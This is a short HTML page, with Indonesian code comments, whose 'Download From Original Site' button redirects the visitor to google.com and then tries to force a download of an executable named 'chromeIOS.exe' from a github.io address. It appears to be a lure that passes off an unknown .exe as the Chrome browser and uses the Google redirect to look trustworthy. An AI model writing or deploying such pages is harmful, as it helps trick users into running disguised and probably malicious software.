<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<script>
function a() {

  // Redirect ke google.com terlebih dahulu
  location.href = 'https://google.com';

  // Setelah 5 detik, trigger download
  setTimeout(function () {
    var link = document.createElement('a');
    link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
    link.download = 'chromeIOS.exe';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, 5000); // Delay 5 detik sebelum download muncul
}
</script>

<center>
  <input type="button" class="button" value="Download From Original Site" onclick="a()">
</center>

</body>
</html>
